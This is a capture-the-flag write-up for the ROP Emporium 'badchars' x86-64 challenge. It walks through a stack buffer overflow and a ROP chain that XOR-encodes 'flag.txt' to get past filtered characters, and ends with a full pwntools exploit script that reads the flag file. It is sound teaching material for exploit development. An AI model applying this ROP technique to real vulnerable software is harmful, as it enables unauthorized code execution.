# badchars

An arbitrary write challenge with a twist; certain input characters get mangled as they make their way onto the stack.
Find a way to deal with this and craft your exploit.

## Writeup

We can check if the binary is stripped or not:

```
badchars: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6c79e265b17cf6845beca7e17d6d8ac2ecb27556, not stripped
```

The binary is not stripped we can see function names.

Now check which checks are enabled in this binary:

```
[*] '/home/kali/ROP-Emporium/badchars/badchars'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```

The stack is not executable, so we can't inject a shellcode.

The program in the **main** function call the function **pwnme**:

```c
void pwnme(void)
{
  ulong nread;
  ulong i;
  ulong j;
  char buffer [32];
  
  setvbuf(_stdout,(char *)0x0,2,0);
  puts("badchars by ROP Emporium");
  puts("x86_64\n");
  memset(buffer,0,32);
  puts("badchars are: \'x\', \'g\', \'a\', \'.\'");
  printf("> ");
  nread = read(0,buffer,512);
  for (i = 0; i < nread; i = i + 1) {
    for (j = 0; j < 4; j = j + 1) {
      if (buffer[i] == "xga.badchars by ROP Emporium"[j]) {
        buffer[i] = -0x15;
      } 
    }
  }
  puts("Thank you!");
  return;
}
```

This function insert **512 bytes** of user input into **32 bytes** of buffer.

The binary also has a function called **print_file**:

```c
void print_file(char *param_1)
{
  char buffer [40];
  FILE *fd;
  
  fd = (FILE *)0x0;
  fd = fopen(param_1,"r");
  if (fd == (FILE *)0x0) {
    printf("Failed to open file: %s\n",param_1);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fgets(buffer,33,fd);
  puts(buffer);
  fclose(fd);
  return;
}
```

We can perform the same attack of **write4** challenge, we only need a way to substitute all of **badchars** that the program replace.

Inside the the binary there are these usefull **gadget**:

```
0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006a0 : pop r14 ; pop r15 ; ret
0x0000000000400634 : mov qword ptr [r13], r12 ; ret
0x00000000004006a3 : pop rdi ; ret
```

So we can put the string **flag.txt** into the stack, **pop** into the register **r12** and **pop** into the register **r13** the address where to store the string.

After that we can use the gadget **mov qword ptr [r13], r12** that store the string and call the function **print_file** with the address of the stored string.

We can use the **.bss** segment to store the string, we can find its address using:

```bash
objdump -x badchars | grep __bss_start
```

With this result:

```
0000000000601038 g       .bss	0000000000000000              __bss_start
```

This segment is **readable** and **writable**, so it is perfect for our purpose.

We can build the following payload:

```python
buffer_dim = 32
offset = buffer_dim + 8

print_file = exe.symbols['print_file']

rop = ROP(exe)
ret = rop.find_gadget(['ret'])[0]
pop_r12_pop_r13_pop_r14_pop_r15 = rop.find_gadget(['pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'])[0]
mov_qword_ptr_r13_r12 = 0x400634
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

string_address = 0x601038

junk = 0xbeef

payload = [
    b'A' * offset,
    p64(ret),
    p64(pop_r12_pop_r13_pop_r14_pop_r15),
    b'flag.txt',            # r12
    p64(string_address),    # r13
    p64(junk),              # r14
    p64(junk),              # r15
    p64(mov_qword_ptr_r13_r12),
    p64(pop_rdi),
    p64(string_address),
    p64(print_file)
]
```

But the difference in this challenge is the presence of a check for this **bad chars**:

```
badchars are: 'x', 'g', 'a', '.'
```

If the program see one of this chars, it will substitue it with **-0x15**.

In the binary there is this useful **gadget**:

```
0x0000000000400628 : xor byte ptr [r15], r14b ; ret
```

So we can insert to the **r15** register the address of the stored string and xor it with the **lower 8 bits** of **r14** register.

Repeat this operation for the length of the filename:

```python
buffer_dim = 32
offset = buffer_dim + 8

print_file = exe.symbols['print_file']

rop = ROP(exe)
ret = rop.find_gadget(['ret'])[0]
pop_r12_pop_r13_pop_r14_pop_r15 = rop.find_gadget(['pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'])[0]
mov_qword_ptr_r13_r12 = 0x400634
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_r14_pop_r15 = rop.find_gadget(['pop r14', 'pop r15'])[0]

string_address = 0x601038
xor_byte = 0x20

xor_byte_ptr_r15_r14b = 0x400628

filename = 'flag.txt'

xored_string = ''
for c in filename:
    xored_string += chr(ord(c) ^ xor_byte)

payload = [
    b'a' * offset,
    p64(ret),
    p64(pop_r12_pop_r13_pop_r14_pop_r15),
    xored_string.encode(),             # r12
    p64(string_address),               # r13
    p64(xor_byte),                     # r14
    p64(string_address),               # r15
    p64(mov_qword_ptr_r13_r12)
]

# XOR again the filename after pass all checks

for i in range(len(filename)):
    payload += [
        p64(pop_r14_pop_r15),
        p64(xor_byte),
        p64(string_address + i),
        p64(xor_byte_ptr_r15_r14b),
    ]

# Call the print_file with correct filename

payload += [
    p64(pop_rdi),
    p64(string_address),
    p64(print_file)
]
```

So the final exploit will be:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template badchars
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'badchars')

context.terminal = ["tmux", "splitw", "-h"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *(&pwnme+261)
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()

buffer_dim = 32
offset = buffer_dim + 8

print_file = exe.symbols['print_file']

rop = ROP(exe)
ret = rop.find_gadget(['ret'])[0]
pop_r12_pop_r13_pop_r14_pop_r15 = rop.find_gadget(['pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'])[0]
mov_qword_ptr_r13_r12 = 0x400634
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_r14_pop_r15 = rop.find_gadget(['pop r14', 'pop r15'])[0]

string_address = 0x601038
xor_byte = 0x20

xor_byte_ptr_r15_r14b = 0x400628

filename = 'flag.txt'

xored_string = ''
for c in filename:
    xored_string += chr(ord(c) ^ xor_byte)

payload = [
    b'a' * offset,
    p64(ret),
    p64(pop_r12_pop_r13_pop_r14_pop_r15),
    xored_string.encode(),             # r12
    p64(string_address),               # r13
    p64(xor_byte),                     # r14
    p64(string_address),               # r15
    p64(mov_qword_ptr_r13_r12)
]

# XOR again the filename after pass all checks

for i in range(len(filename)):
    payload += [
        p64(pop_r14_pop_r15),
        p64(xor_byte),
        p64(string_address + i),
        p64(xor_byte_ptr_r15_r14b),
    ]

# Call the print_file with correct filename

payload += [
    p64(pop_rdi),
    p64(string_address),
    p64(print_file)
]

payload = b''.join(payload)

io.info(f"Payload chars: {payload}")

io.sendlineafter(b'> ', payload)

io.interactive()
```

The output will be:

```
Thank you!
ROPE{a_placeholder_32byte_flag!}
```